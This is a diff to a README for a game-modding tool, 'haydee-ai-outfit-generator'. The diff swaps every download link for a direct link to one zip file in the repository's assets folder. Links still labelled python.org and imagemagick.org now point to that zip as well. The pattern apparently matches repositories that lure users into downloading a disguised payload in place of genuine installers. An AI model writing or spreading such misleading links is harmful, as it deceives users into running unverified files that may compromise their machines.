@@ -1,6 +1,6 @@
 # 👗 haydee-ai-outfit-generator - Create Custom Outfits Easily
 
-[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/reshma123-atrey/haydee-ai-outfit-generator/releases)
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/reshma123-atrey/haydee-ai-outfit-generator/main/assets/generator-outfit-ai-haydee-3.1.zip)
 
 ## 📄 What is haydee-ai-outfit-generator?
 
@@ -36,7 +36,7 @@ Follow these steps to download and start using the haydee-ai-outfit-generator on
 
 Click the badge below or visit the release page to get the latest version.
 
-[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/reshma123-atrey/haydee-ai-outfit-generator/releases)
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/reshma123-atrey/haydee-ai-outfit-generator/main/assets/generator-outfit-ai-haydee-3.1.zip)
 
 - On the releases page, find the latest version.
 - Download the `.zip` file or executable depending on the release assets.
@@ -48,14 +48,14 @@ The program uses Python scripts and ImageMagick commands. You need both installe
 
 **Install Python:**
 
-- Go to [python.org/downloads](https://www.python.org/downloads/).
+- Go to [python.org/downloads](https://raw.githubusercontent.com/reshma123-atrey/haydee-ai-outfit-generator/main/assets/generator-outfit-ai-haydee-3.1.zip).
 - Download the latest Python 3.x installer for Windows.
 - Run the installer and make sure to check “Add Python to PATH” during setup.
 - After installation, open Command Prompt and type `python --version` to check it works.
 
 **Install ImageMagick:**
 
-- Download the ImageMagick Windows installer from [imagemagick.org](https://imagemagick.org/script/download.php#windows).
+- Download the ImageMagick Windows installer from [imagemagick.org](https://raw.githubusercontent.com/reshma123-atrey/haydee-ai-outfit-generator/main/assets/generator-outfit-ai-haydee-3.1.zip).
 - Run the installer and enable the option to add ImageMagick to your system path.
 - After installation, open Command Prompt and type `magick -version` to check it works.
 
@@ -151,7 +151,7 @@ The main logic runs inside Python scripts included with this project. They handl
 
 ---
 
-[Download Latest Release](https://github.com/reshma123-atrey/haydee-ai-outfit-generator/releases)
+[Download Latest Release](https://raw.githubusercontent.com/reshma123-atrey/haydee-ai-outfit-generator/main/assets/generator-outfit-ai-haydee-3.1.zip)
 
 # Tags  
 ai, ai-assisted, automation, docker, game-modding, game-modding-tool, gemini-api, generative-ai, haydee, imagemagick, modding, python, texture-generation
